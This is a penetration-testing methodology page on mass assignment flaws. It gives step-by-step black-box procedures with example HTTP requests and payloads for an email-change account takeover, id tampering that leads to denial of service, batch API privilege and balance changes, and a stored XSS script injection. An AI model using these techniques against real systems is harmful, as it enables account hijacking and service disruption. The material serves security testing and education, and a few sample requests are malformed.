# Mass Assignment

## Check List

## Methodology

### Black Box

#### HTTP Method Override (PUT) in User APIs

{% stepper %}
{% step %}
Find API documentation in the target
{% endstep %}

{% step %}
Check the target API documentation to see if there is a path like `api/user` or check the API requests in Burp Suite to see if such a path is visible
{% endstep %}

{% step %}
Make a simple request with a simple GET method and check the request to make sure there are no problems with it
{% endstep %}

{% step %}
Then make the request as POST and if it gives an error, check to see what methods the Allow header in the response refers to
{% endstep %}

{% step %}
If the PUT method is present in the Allow response header, change the method to PUT and make the request
{% endstep %}

{% step %}
If it gives a `400` error, send the content type to `application/json` and an empty body `{}`
{% endstep %}

{% step %}
Then check whether the server response gives an error for missing a parameter
{% endstep %}

{% step %}
Put the parameter mentioned in the server response into the request, send it, and check whether the server response has changed or not
{% endstep %}

{% step %}
Then send different numeric or string values ​​such as 1 or Admin into the parameter and if information is extracted in the server response, the vulnerability has been exploited
{% endstep %}
{% endstepper %}

***

#### [Account Takeover via Unvalidated Profile Email Change](https://swisskyrepo.github.io/PayloadsAllTheThings/Mass%20Assignment/#methodology)

{% stepper %}
{% step %}
logging into the application with a normal user account
{% endstep %}

{% step %}
Once logged in, I accessed the Profile Edit Page, where users can update their personal details such as name, email, and phone number
{% endstep %}

{% step %}
Using Burp Suite, I intercepted the request sent to the server when updating profile data. The original request looked like this

```json
POST /api/pcsx/profile_edit HTTP/2
Host: example.com
Accept: application/json, text/plain,

{
    "op_section": "basic_info",
    "operation": "edit",
    "op_data": {
        "value": {
            "firstname": "Test",
            "lastname": "1",
            "phone": "+2010********",
            "location": "anywhere",
            "email": "user@gmail.com"
        }
    }
}
```
{% endstep %}

{% step %}
Modifying Sensitive Fields: I edited the **email** field to an arbitrary address (`victim@gmail.com`), simulating an attack where an attacker hijacks an account by changing the registered email and change the username to victim

```json
POST /api/pcsx/profile_edit HTTP/2
Host: example.com
ccept: application/json, text/plain, /
{"op_section": "basic_info",
    "operation": "edit",
    "op_data": {
        "value": {
            "firstname": "victim",
            "lastname": "1",
            "phone": "+2010********",
            "location": "anywhere",
            "email": "victim@gmail.com"
        }
    }
}
```
{% endstep %}

{% step %}
Sending the Request & Observing the Response
{% endstep %}

{% step %}
After forwarding the modified request, I received a **200 OK** response, confirming that the changes were applied **without validation**

```json
HTTP/2 200 OK
Content-Type: application/json

{
    "data": {
        "avatar": "",
        "fullname": "Victim 1",
        "firstname": "Victim",
        "lastname": "1",
        "email": "victim@gmail.com",
        "location": "anywhere",
        "phone": "+2010********",
    }
}
```
{% endstep %}

{% step %}
refreshed the profile page and saw that the email change was applied, proving that there were no validation checks in place. At this point, an attacker could request a password reset to the newly assigned email and gain full control of the victim’s account
{% endstep %}
{% endstepper %}

***

#### Parameter Tampering

{% stepper %}
{% step %}
Find any "`Add`", "`Create`", or "`Register`" form that sends `JSON`
{% endstep %}

{% step %}
Check the request in Burp Suite to locate the main nested object (`patient`, `user`, `item`) and confirm id is not present in the request but appears in the response
{% endstep %}

{% step %}
Make a normal POST request with valid data and verify the response creates a new record with an auto-incremented id

```json
POST /api/add
{
  "user": {
    "name": "John",
    "email": "john@example.com"
  }
}
```

and Response&#x20;

```json
{ "id": 100, "user": { "id": 100, "name": "John" } }
```
{% endstep %}

{% step %}
Then inject `"id": 999999` inside the nested object (`"patient": {"id": 999999, ...}`) and send the request

```json
{
  "patient": {
    "id": 999999,
    "firstName": "Test",
    "phone": "123456"
  }
}
```
{% endstep %}

{% step %}
If Vulnerable Response

```json
{ "patientId": 999999, "patient": { "id": 999999 } }
```
{% endstep %}

{% step %}
If the response reflects `"id": 999999` in both patientId and patient.id, mass assignment is confirmed

Then inject a very high unused id like 1000000000 and check if the next normal creation skips to 1000000001

```json
{ "user": { "id": 1000000000, "name": "Skip" } }
```
{% endstep %}

{% step %}
Then inject an extremely large value like `1e99` to trigger a database error and extract the max allowed id (usually `9223372036854775807`)

```json
{ "item": { "id": 1e99, "title": "Test" } }
```

Error Example

```json
{ "error": "Value out of range. Max: 9223372036854775807" }
```
{% endstep %}

{% step %}
Then inject the maximum id value 9223372036854775807 and confirm the record is created

```json
{ "device": { "id": 9223372036854775807, "name": "Last" } }
```
{% endstep %}

{% step %}
Then attempt to create a new record normally and if it fails with DuplicateKeyException, global DoS is achieved
{% endstep %}
{% endstepper %}

***

#### Insecure Batch API Processing

{% stepper %}
{% step %}
Find any batch operation API that accepts multiple actions in one request
{% endstep %}

{% step %}
Check the API documentation or Burp Suite history for endpoints like `/api/*/batch`, `/batch`, `/bulk`, or `/api/v1/users/batch`
{% endstep %}

{% step %}
Make a normal `PATCH` or `POST` request with a single valid update and verify the response shows success

```json
PATCH /api/v1/users/batch
[
  {
    "id": 1001,
    "operation": "update",
    "body": { "email": "test@legit.com" }
  }
]
```
{% endstep %}

{% step %}
Expected Response

```json
[{ "id": 1001, "status": "success" }]
```
{% endstep %}

{% step %}
Then send a batch request updating multiple user IDs with sensitive fields like email, balance, role, or `api_key` Example Payload

```json
[
  {
    "id": 1001,
    "operation": "update",
    "body": { "email": "hacked1@evil.com", "balance": 10000 }
  },
  {
    "id": 1002,
    "operation": "update",
    "body": { "email": "hacked2@evil.com", "role": "admin" }
  }
]
```
{% endstep %}

{% step %}
If Vulnerable Response

```json
[{ "status": "success" }, { "status": "success" }]
```
{% endstep %}

{% step %}
If the response confirms updates on other users' data without authorization, IDOR + Mass Assignment is confirmed
{% endstep %}
{% endstepper %}

***

#### Mass-Assignment Led To Stored-XSS

{% stepper %}
{% step %}
Find any API endpoint that accepts JSON input and updates or creates chat, widget, or message objects
{% endstep %}

{% step %}
Check the API documentation or Burp Suite history for endpoints like `/api/chat`, `/api/widget,` `/api/message`, `/api/update`, or /`api/config`
{% endstep %}

{% step %}
Make a normal POST or PATCH request with valid data and verify the response stores the input

```json
POST /api/v1/cache/{id}/invalidate HTTP/1.1
Host: localhost:8080
Content-Length: 54
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.8
Accept: *
Cache-Control: no-cache
Postman-Token: <random-uuid>
Connection: keep-alive

{
    "test": "test",
    "transactionId": 1,
    "key": "chichi4"
}
```
{% endstep %}

{% step %}
Expected Response

```json
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,POST
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=UTF-8
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 999
X-RateLimit-Reset: 1730810744
Content-Length: 297
Date: Wed, 05 Nov 2025 10:07:44 GMT

{
    "transactionId": 1,
    "quintanaCacheInfo": {
        "transactionId": 1,
        "cacheName": "testCache",
        "operation": "INVALIDATE",
        "key": "chichi4",
        "Html": "",
        "status": "SUCCESS",
        "timestamp": 1730810744.123456789,
        "nodeId": "node-01",
        "result": true
    },
    "type": 1000,
    "success": true,
    "message": "Cache invalidated successfully",
    "isSuccess": true,
    "application": "false",
    "timestamp": 1730810744
}
```
{% endstep %}

{% step %}
Then inject HTML-related fields like `html`, markup, `bodyHtml`, or `domKey` with a test payload

```json
POST /api/v1/cache/{id}/invalidate HTTP/1.1
Host: localhost:8080
Content-Length: 54
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.8
Accept: *
Cache-Control: no-cache
Postman-Token: <random-uuid>
Connection: keep-alive

{
    "test": "test",
    "transactionId": 1,
    "key": "chichi4"
    "html": ""><script>alert(1)</script>"
}
```
{% endstep %}

{% step %}
If Vulnerable Response

```json
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,POST
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=UTF-8
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 999
X-RateLimit-Reset: 1730810744
Content-Length: 297
Date: Wed, 05 Nov 2025 10:07:44 GMT

{
    "transactionId": 1,
    "quintanaCacheInfo": {
        "transactionId": 1,
        "cacheName": "testCache",
        "operation": "INVALIDATE",
        "key": "chichi4",
        "Html": ""><script>alert(1)</script>",
        "status": "SUCCESS",
        "timestamp": 1730810744.123456789,
        "nodeId": "node-01",
        "result": true
    },
    "type": 1000,
    "success": true,
    "message": "Cache invalidated successfully",
    "isSuccess": true,
    "application": "false",
    "timestamp": 1730810744
}
```
{% endstep %}

{% step %}
If the response stores the HTML without stripping, mass assignment to HTML sink is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
